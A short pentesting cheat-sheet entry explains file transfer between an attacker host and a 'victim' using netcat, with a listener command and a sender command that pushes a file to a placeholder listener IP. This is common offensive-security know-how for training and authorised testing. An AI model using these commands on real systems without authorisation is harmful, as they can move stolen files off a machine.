When pentesting, you have to make do with whatever tools you have, especially if you can't download more.  
Figuring out which tool(s) you have available to get/put files between host and victim is essential.  

## Netcat  

Transfer a single, specified file **out.file** and receive it as **in.file**

**Listener / Receiver**  

```bash
nc -l -p 8899 > in.file
```

**Host / Sender**  

```bash
# '-w 3' is a 3 second timeout

nc -w 3 [listener IP] 8899 < out.file
```
